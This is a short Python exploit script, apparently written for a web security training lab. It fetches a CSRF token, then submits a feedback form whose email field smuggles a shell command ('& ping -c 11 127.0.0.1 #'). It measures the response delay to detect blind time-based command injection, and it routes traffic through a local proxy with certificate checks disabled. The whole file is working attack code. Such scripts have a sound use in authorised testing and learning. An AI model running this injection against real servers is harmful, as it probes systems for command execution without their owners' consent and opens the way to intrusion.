import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, url):
    feedback_path = '/feedback'
    r = session.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def run_command_injection(session, url):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'payload@exploit.com & ping -c 11 127.0.0.1 #'
    csrf_token = get_csrf_token(session, url)
    data = {'csrf': csrf_token, 'name': 'exploit', 'email': command_injection, 'subject': 'test exploit', 'message': 'exploiting command injection'}
    res = session.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    if (res.elapsed.total_seconds() >=10):
        print("(+) Email field vulnerable to time-based command Injection!")
    else:
        print("(-) Email field not vulnerable to time-based command Injection")

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <URL>")
        print(f"(+) Example Usage: {sys.argv[0]} \"www.domain.com\"")
        sys.exit(1)

    url = sys.argv[1]
    print("(+) Checking if email parameter is vulnerable to Command Injection")

    # Load the main page and extractring CSRF Token
    session = requests.Session()
    run_command_injection(session, url)

if __name__ == "__main__":
    main()
